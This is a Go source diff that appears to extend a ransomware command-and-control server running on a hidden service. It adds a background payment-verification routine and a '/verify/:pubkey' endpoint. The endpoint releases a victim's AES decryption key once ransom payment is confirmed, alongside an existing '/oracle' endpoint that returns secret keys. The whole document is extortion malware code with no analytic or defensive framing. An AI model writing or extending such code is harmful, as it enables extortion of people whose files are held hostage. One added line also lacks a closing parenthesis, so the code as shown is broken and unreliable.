@@ -33,10 +33,12 @@ func setup() {
 
     // instantiate the crypto scheme
     scheme = attacker.NewScheme()
+    go scheme.VerifyPaymentsBackground()
 
     // http router config
     router := httprouter.New()
     router.GET("/oracle", handleOracle)
+    router.GET("/verify/:pubkey", handleVerify)
 
     // start server
     log.Println("Listening on localhost at :9999 and :80 on the hidden service")
@@ -73,4 +75,20 @@ func handleOracle(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
     size = int64(len(keys.Secret))
     binary.Write(w, binary.BigEndian, &size)
     w.Write(keys.Secret)
+}
+
+func handleVerify(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
+    var response int64
+    aesIVKey := scheme.VerifyPayment(ps.ByName("pubkey")
+
+    if aesIVKey == nil {
+        binary.Write(w, binary.BigEndian, &response)
+        return
+    }
+
+    w.Header().Set("Content-Disposition", `attachment; filename="aes.bin"`)
+
+    response = 1
+    binary.Write(w, binary.BigEndian, &response)
+    w.Write(aesIVKey)
 }
